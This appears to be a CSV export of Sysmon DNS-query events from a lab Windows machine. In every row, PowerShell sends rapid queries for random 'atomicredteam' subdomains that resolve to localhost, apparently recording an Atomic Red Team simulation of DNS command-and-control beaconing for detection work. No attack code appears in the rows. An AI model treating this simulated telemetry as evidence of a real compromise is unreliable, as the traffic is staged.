"2025-12-22 13:58:13.791 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165581,"Query: atomicredteam-442903.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:13.613","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:14.797 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165582,"Query: atomicredteam-246295.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:13.657","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:14.797 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165583,"Query: atomicredteam-469484.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:13.976","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:14.797 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165584,"Query: atomicredteam-493040.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:14.150","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:14.797 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165585,"Query: atomicredteam-183259.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:14.472","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:14.797 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165586,"Query: atomicredteam-533438.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:14.516","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:14.797 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165587,"Query: atomicredteam-229645.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:14.559","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:14.797 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165588,"Query: atomicredteam-579067.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:14.649","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:15.807 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165589,"Query: atomicredteam-391041.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:14.969","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:15.807 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165590,"Query: atomicredteam-491076.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:15.012","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:15.807 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165591,"Query: atomicredteam-116497.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:15.054","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:15.807 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165592,"Query: atomicredteam-350416.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:15.224","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:15.807 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165593,"Query: atomicredteam-54638.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:15.265","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:15.807 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165594,"Query: atomicredteam-703743.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:15.306","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:15.807 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165595,"Query: atomicredteam-110396.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:15.346","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:15.808 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165596,"Query: atomicredteam-874072.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:15.387","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:15.808 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165597,"Query: atomicredteam-835130.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:15.562","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:15.808 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165598,"Query: atomicredteam-912885.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:15.605","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:15.808 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165599,"Query: atomicredteam-318599.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:15.650","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:16.821 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165600,"Query: atomicredteam-293946.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:15.693","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:16.821 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165601,"Query: atomicredteam-96012.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:15.736","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:16.821 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165602,"Query: atomicredteam-242939.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:15.907","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:16.821 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165603,"Query: atomicredteam-746912.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:15.950","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:16.821 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165604,"Query: atomicredteam-461568.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:16.010","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:16.821 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165605,"Query: atomicredteam-581906.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:16.057","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:16.821 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165606,"Query: atomicredteam-38463.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:16.097","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:16.822 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165607,"Query: atomicredteam-481920.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:16.266","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:16.822 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165608,"Query: atomicredteam-787104.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:16.311","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:16.822 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165609,"Query: atomicredteam-48106.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:16.353","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:16.822 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165610,"Query: atomicredteam-302622.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:16.396","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:16.822 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165611,"Query: atomicredteam-199348.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:16.438","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:16.822 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165612,"Query: atomicredteam-233504.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:16.754","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:17.821 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165613,"Query: atomicredteam-295869.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:16.925","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:17.822 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165614,"Query: atomicredteam-682571.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:17.246","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:17.822 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165615,"Query: atomicredteam-865705.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:17.290","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:17.822 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165616,"Query: atomicredteam-997644.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:17.334","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:17.822 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165617,"Query: atomicredteam-943520.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:17.378","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:17.822 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165618,"Query: atomicredteam-425482.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:17.420","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:17.822 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165619,"Query: atomicredteam-439102.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:17.463","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:18.835 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165620,"Query: atomicredteam-339899.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:17.784","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:18.835 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165621,"Query: atomicredteam-841718.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:17.829","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:18.835 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165622,"Query: atomicredteam-723550.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:17.873","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:18.836 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165623,"Query: atomicredteam-623793.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:17.917","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:18.836 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165624,"Query: atomicredteam-410242.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:17.960","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:18.836 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165625,"Query: atomicredteam-199662.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:17.999","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:18.836 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165626,"Query: atomicredteam-393990.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:18.045","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:18.836 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165627,"Query: atomicredteam-869338.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:18.087","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:18.836 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165628,"Query: atomicredteam-190809.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:18.132","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:18.836 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165629,"Query: atomicredteam-325032.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:18.174","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
